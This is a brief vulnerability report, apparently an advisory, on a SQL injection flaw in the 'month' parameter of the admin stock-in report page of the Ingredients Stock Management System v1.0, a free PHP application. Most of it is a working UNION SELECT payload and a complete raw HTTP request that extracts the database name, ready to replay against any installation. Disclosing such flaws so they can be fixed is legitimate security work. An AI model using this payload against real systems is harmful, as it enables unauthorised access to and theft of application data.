# Ingredients Stock Management System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15364/ingredients-stock-management-system-phpoop-free-source-code.html

Vulnerability File: /isms/admin/?page=reports/stockin&month=

Vulnerability location: /isms/admin/?page=reports/stockin&month=, month

db_name = isms_db;

[+] Payload: /isms/admin/?page=reports/stockin&month=2022-07%27%20union%20select%201,2,3,4,5,6,7,database(),9,10--+ // Leak place ---> month

```sql
GET /isms/admin/?page=reports/stockin&month=2022-07%27%20union%20select%201,2,3,4,5,6,7,database(),9,10--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: _ga=GA1.1.1382961971.1655097107; PHPSESSID=2m880botn1u43hd2gu23ttj4ug
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/179383745-e6484a76-e52f-4b4c-9a7b-94912a793b38.png)
